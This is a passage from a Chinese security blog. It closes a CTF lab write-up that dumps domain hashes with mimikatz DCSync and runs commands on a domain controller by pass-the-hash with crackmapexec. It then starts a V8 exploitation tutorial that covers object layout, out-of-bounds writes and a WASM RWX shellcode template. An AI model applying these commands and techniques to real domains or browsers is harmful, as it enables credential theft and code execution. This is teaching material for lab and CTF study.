<code>DCSync</code></p><blockquote><p>在域中，不同的域控之间，默认每隔15min就会进行一次域数据同步。当一个额外的域控想从其他域控同步数据时，额外域控会像其他域控发起请求，请求同步数据。如果需要同步的数据比较多，则会重复上述过程。DCSync就是利用这个原理，通过目录复制服务（Directory Replication Service，DRS）的GetNCChanges接口像域控发起数据同步请求，以获得指定域控上的活动目录数据。目录复制服务也是一种用于在活动目录中复制和管理数据的RPC协议。该协议由两个RPC接口组成。分别是drsuapi和dsaop。<br>DCSync是mimikatz在2015年添加的一个功能，由Benjamin DELPY gentilkiwi和Vincent LE TOUX共同编写，能够用来导出域内所有用户的hash</p></blockquote><p>也就是说我们可以通过 <code>DCSync</code> 来导出所有用户的 <code>hash</code> 然后进行哈希传递攻击，要想使用 <code>DCSync</code> 必须获得以下任一用户的权限：</p><blockquote><p>Administrators 组内的用户<br>Domain Admins 组内的用户<br>Enterprise Admins 组内的用户域控制器的计算机帐户</p></blockquote><p>现在我们回到一开始 <code>fscan</code> 的扫描结果：</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/29.png" class="" title="我的图图呢">  <p>我们可以看到我们用永恒之蓝打下的这台机子是 <code>enterprise</code> 用户，也就是说满足 <code>DCSync</code> 攻击的条件，于是我们在 <code>msf</code> 中依次输入以下命令来获取用户的 <code>hash</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load kiwi  <span class="comment"># 调用mimikatz模块</span></span><br><span class="line">kiwi_cmd <span class="string">&quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot;</span> <span class="built_in">exit</span>  <span class="comment"># 导出域内所有用户的信息(包括哈希值)</span></span><br></pre></td></tr></table></figure><p>结果如下：</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/30.png" class="" title="我的图图呢">  <p>这里我们比较关注是 <code>Administrator</code> 用户的 <code>hash</code>，接下来我们使用 <code>crackmapexec</code> 来进行哈希传递攻击，来实现 <code>DC域控</code> 上的任意命令执行，通过以下命令来获取 <code>flag3</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x <span class="string">&quot;type Users\Administrator\flag\flag03.txt&quot;</span></span><br></pre></td></tr></table></figure><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/31.png" class="" title="我的图图呢">  <p>最终 <code>flag</code> 为 <code>flag&#123;60b53231-2ce3-4813-87d4-e8f88d0d43d6&#125;</code></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>感觉这种渗透和穿透的web还是有一点区别，从外网打进内网的过程要第一步要做的不是自己去寻找和日漏洞，而是看看系统有没有历史遗留的漏洞以及是否有现成的exp进行攻击。打国决的时候有的队伍拿着现成的exp直接开局2分钟就打进内网了，而我们队伍就和做传统web题目一样一步一步的打，耗费了很多时间才打进去，非常的吃亏。<br>在打这个靶场中花费时间最多的是用 <code>frp</code> 进行内网穿透，主要是我理解能力比较差，网上的文章看的似懂非懂的。期间还请教了unknown师傅和panz0e师傅，然后某人就因为这件事情没完成上班任务😂😂😂😂😂</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/32.png" class="" title="我的图图呢">  <p>虽然靶场比较简单，可是还是花费了我许多的时间，还是Csome师兄说的那句话：“菜就多练”，这一年打算多练练渗透，希望明年国赛不会留下遗憾<br>参考：<br><a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync">域渗透——DCSync (3gstudent.github.io)</a><br><a href="https://blog.csdn.net/weixin_63576152/article/details/133462469">春秋云境Initial-WP（附带详细代理过程）_lnitial靶机-CSDN博客</a><br><a href="https://blog.csdn.net/ElsonHY/article/details/109939420">MS17-010（Eternal blue永恒之蓝）漏洞利用+修复方法-CSDN博客</a><br><a href="https://bbs.kanxue.com/thread-269208.htm">[原创]MS17-010 “永恒之蓝”漏洞分析与复现-二进制漏洞-看雪-安全社区|安全招聘|kanxue.com</a><br><a href="https://cloud.tencent.com/developer/article/1861364">内网渗透｜谈谈HASH传递那些世人皆知的事-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>初探v8漏洞利用</title>
      <link href="/2024/05/05/v8start/"/>
      <url>/2024/05/05/v8start/</url>
      
        <content type="html"><![CDATA[<p>一直觉得 <code>v8</code> 漏洞利用是一件非常好玩的事情，所以找时间入门了一下，这篇博客所使用的环境是 <code>*CTF 2019</code> 的 <code>oob</code>，相关附件读者可以自行上网搜索下载。这篇博客主要用于总结本人在入门 <code>v8</code> 漏洞利用时所学到的东西，由于 <code>Qanux</code> 又菜又爱玩，文章不免存在许多的问题，请读者多多包容  </p><h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><p>在开始之前，肯定有很多人想问 v8 是一个什么东西，下面是在知乎中搜到的对于 v8 的描述：  </p><blockquote><p>V8引擎是由C++编写的Google开源高性能JavaScript和WebAssembly引擎，它用于Chrome和Node.js等。<br>V8可以独立运行，也可以嵌入到任何C++应用程序中。<br>V8支持众多操作系统，如Windows、linux、android等，也支持其他硬件架构，如IA32,X64,ARM等，具有很好的可移植和跨平台特性。  </p></blockquote><p>作为 <code>js</code> 引擎，<code>V8</code> 会编译 &#x2F; 执行 <code>JavaScript</code> 代码，管理内存，负责垃圾回收，与宿主语言的交互等。通过暴露宿主对象 (变量，函数等) 到 <code>JavaScript</code>，<code>JavaScript</code> 可以访问宿主环境中的对象，并在脚本中完成对宿主对象的操作。<br>接下来看看 <code>v8</code> 工作原理的简化细分：  </p><img src="/2024/05/05/v8start/1.png" class="" title="我的图图呢">  <p>当 <code>Chrome</code> 或 <code>Node.js</code> 需要执行一段 <code>JavaScript</code> 代码时，它会将源代码传递给 <code>V8</code>。<code>V8</code> 将 <code>JavaScript</code> 源代码送入所谓的解析器 (<code>Parser</code>)，解析器为源代码创建一个抽象语法树 (<code>AST</code>) 表示。<code>AST</code> 随后被传递给新引入的 <code>Ignition</code> 解释器，在那里它被转换成一系列字节码。然后，<code>Ignition</code> 执行这个字节码序列。<br>在执行过程中，<code>Ignition</code> 收集了有关某些操作输入的剖析信息或反馈。其中一些反馈被 <code>Ignition</code> 自身用来加速后续的字节码解释。例如，对于属性访问，如果在所有时间都具有相同的形状 (即你总是为属性a传递一个值，其中 <code>a</code> 是一个字符串)，我们会缓存如何获取 <code>a</code> 值的信息。在后续执行相同的字节码时，我们不需要再次搜索a。这里的底层机制称为内联缓存 (<code>IC</code>)。  </p><p>接下来再聊聊什么是 <code>d8</code>。<code>d8</code> 是一个非常有用的调试工具，你可以把它看成是 <code>debug for V8</code> 的缩写。我们可以使用 <code>d8</code> 来查看 <code>V8</code> 在执行 <code>JavaScript</code> 过程中的各种中间数据，比如作用域、AST、字节码、优化的二进制代码、垃圾回收的状态，还可以使用 <code>d8</code> 提供的私有 <code>API</code> 查看一些内部信息。  </p><h1 id="走进v8"><a href="#走进v8" class="headerlink" title="走进v8"></a>走进v8</h1><p>本来想写写如何配置 <code>v8</code> 环境的，可是网上相关资料太多了，加上笔者比较懒，就没写，等哪天心血来潮再补上吧  </p><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>在给 <code>gdb</code> 配置好 <code>v8</code> 的调试文件后，即可利用如下命令来调试我们的 <code>JavaScript</code> 代码：  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb ./d8</span><br><span class="line">r --allow-natives-syntax --shell ./exp.js</span><br></pre></td></tr></table></figure><p>这里解释一下命令里面的几个参数：  </p><ul><li>–allow-natives-syntax：开启原生 <code>API</code> (用的比较多)  </li><li>–shell：运行脚本后切入交互模式</li></ul><p>在调试的过程中我们可以在代码中加入如下代码来进行调试：  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%<span class="title class_">DebugPrint</span>(obj);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure><p>其中 <code>%DebugPrint(obj);</code> 作用为打印对象的信息 (<code>debug</code> 版本的 <code>d8</code> 可以打印对象的详细信息，而 <code>release</code> 版本的 <code>d8</code> 只会打印对象类型和对象的地址)，<code>%SystemBreak();</code> 的作用类似于断点<br>由于标准的 <code>JavaScript</code> 并不支持以上语法，所以在运行时要加上 <code>--allow-natives-syntax</code> 选项<br>现在使用如下代码来进行测试：  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure><p>启动效果如下：  </p><img src="/2024/05/05/v8start/2.png" class="" title="我的图图呢">  <p>可以看见打印出了这个整数数组的地址，由于我这个 <code>d8</code> 是 <code>release</code> 版本，所以并没有打印出该数组对象的详细信息，但我们可以使用 <code>job</code> 命令来达到相同的效果  </p><img src="/2024/05/05/v8start/3.png" class="" title="我的图图呢">  <p>这里有个需要注意的点，那就是 <code>DebugPrint</code> 打印出来的是真实地址加一，而 <code>job</code> 命令后面接着的也需要是 <code>object</code> 的真实地址加一，不然会被解析成 <code>smi</code> 类型  </p><h2 id="v8-object的基本结构"><a href="#v8-object的基本结构" class="headerlink" title="v8 object的基本结构"></a>v8 object的基本结构</h2><p>首先给出 <code>object</code> 的通用结构：  </p><img src="/2024/05/05/v8start/4.png" class="" title="我的图图呢">  <p>不同对象的 <code>object</code> 结构都会不一样，但是都有很多相似之处，现在就来详细分析上面给出的例子，为了防止忘记，这里再次贴出代码：  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure><p>还是给出一样的结果：  </p><img src="/2024/05/05/v8start/3.png" class="" title="我的图图呢">  <p>可以看出该对象为 <code>JSArray</code>，其结构和 <code>object</code> 的通用结构差不多，但是还是有一点点区别<br>下面是 <code>JSArray</code> 的结构图：</p><img src="/2024/05/05/v8start/5.png" class="" title="我的图图呢">  <p>其各个字段的含义大致如下：  </p><ul><li>map：定义了如何访问对象，具有相同 <code>Map</code> 的两个 <code>JS object</code> ，就代表具有相同的类型（即具有以相同顺序命名的相同属性），比较 Map 的地址即可确定类型是否⼀致，同理，替换掉 Map 就可以进行类型混淆。  </li><li>prototype：对象的原型（如果有） </li><li>elements：对象的地址  </li><li>length：长度</li></ul><p>我们可以在 <code>gdb</code> 中查看 <code>elements</code>  </p><img src="/2024/05/05/v8start/6.png" class="" title="我的图图呢">  <p>可以看见 <code>elements</code> 中的数据也分为 <code>3</code> 层，分别为 <code>map</code> 指针、<code>length</code>、<code>data</code><br>这里还有一个需要注意的地方，那就是 <code>elements</code> 的地址是在 <code>object</code> 的上方的，也就是说程序在申请一个对象时，是先向堆申请一块空间用于存储对象的数据，再申请一块空间用于管理该对象。虽然 <code>elements</code> 是在 obj 上上方，但这并不代表 <code>elements</code> 就一定紧贴着 <code>obj</code>，这个问题我打算留到后面再讲<br>好像相关结构了解到这里就差不多了，如果后面还有别的那就再补补吧（笑  </p><h2 id="v8漏洞利用思想"><a href="#v8漏洞利用思想" class="headerlink" title="v8漏洞利用思想"></a>v8漏洞利用思想</h2><p>通过上面对 <code>object</code> 结构的分析，也许有人已经知道进行漏洞的利用了。可以猜测我们对一个对象进行访问时下标的最大值是由 <code>elements</code> 上的 <code>length</code> 所决定的，如果我们可以修改这个 <code>length</code> 为一个很大的值，我们就能够做到越界读写。同时，如果我们可以修改 <code>obj</code> 中的 <code>map</code>，我们令其出现神奇的效果，具体在下面漏洞利用中再分析<br>在平时的 <code>CTF</code> 题目中我们的目的是如何让程序执行 <code>system(&quot;/bin/sh&quot;)</code>，而在 <code>v8</code> 中，我们的目的是让 v8 任意执行我们的 <code>shellcode</code><br>然而实现这一切需要一个前提，那就是需要存在 <code>rwx</code> 权限的区域。这时候就需要 <code>WASM</code> 登场了<br>什么是 <code>WASM</code>？顾名思义，是 <code>Asm on the web</code>，但其实不是真正意义上的汇编，只是更加接近汇编。<code>WASM</code> 可以在 <code>Javascript Engine</code> 的地址空间中导入一块可读可写可执行的内存页。<br>下面看看这一段代码：  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>,</span><br><span class="line">    <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>,</span><br><span class="line">    <span class="number">42</span>, <span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> wasm_mod = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(<span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code));</span><br><span class="line"><span class="keyword">let</span> f = wasm_mod.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(wasm_mod);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(f);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure><p>结果：  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">0x0d1dfcf5f731 &lt;Instance map = 0x1ccbe5f49789&gt;</span><br><span class="line">0x0d1dfcf5f929 &lt;JSFunction 0 (sfi = 0xd1dfcf5f8f1)&gt;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; job 0x0d1dfcf5f731</span><br><span class="line">0xd1dfcf5f731: [WasmInstanceObject] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x1ccbe5f49789 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x23f8cbe0ac19 &lt;Object map = 0x1ccbe5f4abd9&gt;</span><br><span class="line"> - elements: 0x0cb6b4d40c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - module_object: 0x23f8cbe10fb1 &lt;Module map = 0x1ccbe5f491e9&gt;</span><br><span class="line"> - exports_object: 0x23f8cbe111e9 &lt;Object map = 0x1ccbe5f4ad19&gt;</span><br><span class="line"> - native_context: 0x0d1dfcf41869 &lt;NativeContext[246]&gt;</span><br><span class="line"> - memory_object: 0x0d1dfcf5f859 &lt;Memory map = 0x1ccbe5f4a189&gt;</span><br><span class="line"> - table 0: 0x23f8cbe11181 &lt;Table map = 0x1ccbe5f49aa9&gt;</span><br><span class="line"> - imported_function_refs: 0x0cb6b4d40c71 &lt;FixedArray[0]&gt;</span><br><span class="line"> - managed_native_allocations: 0x23f8cbe11129 &lt;Foreign&gt;</span><br><span class="line"> - memory_start: 0x7f9440280000</span><br><span class="line"> - memory_size: 65536</span><br><span class="line"> - memory_mask: ffff</span><br><span class="line"> - imported_function_targets: 0x55ab193567e0</span><br><span class="line"> - globals_start: (nil)</span><br><span class="line"> - imported_mutable_globals: 0x55ab19356800</span><br><span class="line"> - indirect_function_table_size: 0</span><br><span class="line"> - indirect_function_table_sig_ids: (nil)</span><br><span class="line"> - indirect_function_table_targets: (nil)</span><br><span class="line"> - properties: 0x0cb6b4d40c71 &lt;FixedArray[0]&gt; &#123;&#125;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; job 0x0d1dfcf5f929</span><br><span class="line">0xd1dfcf5f929: [Function] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x1ccbe5f44379 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x0d1dfcf42109 &lt;JSFunction (sfi = 0xe9259bc3b29)&gt;</span><br><span class="line"> - elements: 0x0cb6b4d40c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - <span class="keyword">function</span> prototype: &lt;no-prototype-slot&gt;</span><br><span class="line"> - shared_info: 0x0d1dfcf5f8f1 &lt;SharedFunctionInfo 0&gt;</span><br><span class="line"> - name: 0x0cb6b4d44ae1 &lt;String[<span class="comment">#1]: 0&gt;</span></span><br><span class="line"> - formal_parameter_count: 0</span><br><span class="line"> - kind: NormalFunction</span><br><span class="line"> - context: 0x0d1dfcf41869 &lt;NativeContext[246]&gt;</span><br><span class="line"> - code: 0x323b6e002001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"> - WASM instance 0xd1dfcf5f731</span><br><span class="line"> - WASM <span class="keyword">function</span> index 0</span><br><span class="line"> - properties: 0x0cb6b4d40c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    <span class="comment">#length: 0x0e9259bc04b9 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line">    <span class="comment">#name: 0x0e9259bc0449 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line">    <span class="comment">#arguments: 0x0e9259bc0369 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line">    <span class="comment">#caller: 0x0e9259bc03d9 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> - feedback vector: not available</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>可以看见此时内存已经出现了拥有 <code>rwx</code> 权限的区域</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">0xfb58ac2e000      0xfb58ac2f000 rwxp     1000      0 [anon_fb58ac2e]</span><br></pre></td></tr></table></figure><p>现在的问题是我们要如何获取到这个内存区域的地址，我们来查看一下 <code>f</code> 的 <code>shared_info</code> 结构的信息：  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x0d1dfcf5f8f1</span><br><span class="line">0xd1dfcf5f8f1: [SharedFunctionInfo] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x0cb6b4d409e1 &lt;Map[56]&gt;</span><br><span class="line"> - name: 0x0cb6b4d44ae1 &lt;String[<span class="comment">#1]: 0&gt;</span></span><br><span class="line"> - kind: NormalFunction</span><br><span class="line"> - function_map_index: 144</span><br><span class="line"> - formal_parameter_count: 0</span><br><span class="line"> - expected_nof_properties: 0</span><br><span class="line"> - language_mode: sloppy</span><br><span class="line"> - data: 0x0d1dfcf5f8c9 &lt;WasmExportedFunctionData&gt;</span><br><span class="line"> - code (from data): 0x323b6e002001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"> - <span class="keyword">function</span> token position: -1</span><br><span class="line"> - start position: -1</span><br><span class="line"> - end position: -1</span><br><span class="line"> - no debug info</span><br><span class="line"> - scope info: 0x0cb6b4d40c61 &lt;ScopeInfo[0]&gt;</span><br><span class="line"> - length: 0</span><br><span class="line"> - feedback_metadata: 0xcb6b4d42a39: [FeedbackMetadata]</span><br><span class="line"> - map: 0x0cb6b4d41319 &lt;Map&gt;</span><br><span class="line"> - slot_count: 0</span><br><span class="line"></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>接下里再查看其 <code>data</code> 结构：  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x0d1dfcf5f8c9</span><br><span class="line">0xd1dfcf5f8c9: [WasmExportedFunctionData] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x0cb6b4d45879 &lt;Map[40]&gt;</span><br><span class="line"> - wrapper_code: 0x323b6e002001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"> - instance: 0x0d1dfcf5f731 &lt;Instance map = 0x1ccbe5f49789&gt;</span><br><span class="line"> - function_index: 0</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>再查看 <code>instance</code> 结构：  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x0d1dfcf5f731</span><br><span class="line">0xd1dfcf5f731: [WasmInstanceObject] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x1ccbe5f49789 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x23f8cbe0ac19 &lt;Object map = 0x1ccbe5f4abd9&gt;</span><br><span class="line"> - elements: 0x0cb6b4d40c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - module_object: 0x23f8cbe10fb1 &lt;Module map = 0x1ccbe5f491e9&gt;</span><br><span class="line"> - exports_object: 0x23f8cbe111e9 &lt;Object map = 0x1ccbe5f4ad19&gt;</span><br><span class="line"> - native_context: 0x0d1dfcf41869 &lt;NativeContext[246]&gt;</span><br><span class="line"> - memory_object: 0x0d1dfcf5f859 &lt;Memory map = 0x1ccbe5f4a189&gt;</span><br><span class="line"> - table 0: 0x23f8cbe11181 &lt;Table map = 0x1ccbe5f49aa9&gt;</span><br><span class="line"> - imported_function_refs: 0x0cb6b4d40c71 &lt;FixedArray[0]&gt;</span><br><span class="line"> - managed_native_allocations: 0x23f8cbe11129 &lt;Foreign&gt;</span><br><span class="line"> - memory_start: 0x7f9440280000</span><br><span class="line"> - memory_size: 65536</span><br><span class="line"> - memory_mask: ffff</span><br><span class="line"> - imported_function_targets: 0x55ab193567e0</span><br><span class="line"> - globals_start: (nil)</span><br><span class="line"> - imported_mutable_globals: 0x55ab19356800</span><br><span class="line"> - indirect_function_table_size: 0</span><br><span class="line"> - indirect_function_table_sig_ids: (nil)</span><br><span class="line"> - indirect_function_table_targets: (nil)</span><br><span class="line"> - properties: 0x0cb6b4d40c71 &lt;FixedArray[0]&gt; &#123;&#125;</span><br><span class="line"></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>仔细查看能发现，<code>instance</code> 结构就是 <code>js</code> 代码中的 <code>wasm_mod</code> 变量的地址<br>我们再来查看这个结构的内存布局：  </p><img src="/2024/05/05/v8start/7.png" class="" title="我的图图呢">  <p>仔细看，能发现，<code>rwx</code> 段的起始地址储存在 <code>instance+0x88</code> 的位置，不过这个不用记，不同版本，这个偏移值可能会有差距，可以在写 <code>exp</code> 的时候通过上述调试的方式进行查找。<br>根据 WASM 的特性，我们的目的可以更细化了，现在我们的目的变为了把 <code>shellcode</code> 写到 <code>WASM</code> 的代码段，然后执行 <code>WASM</code> 函数，那么就能执行 <code>shellcode</code> 了。<br>这里可以写成一个固定的模板：   </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span 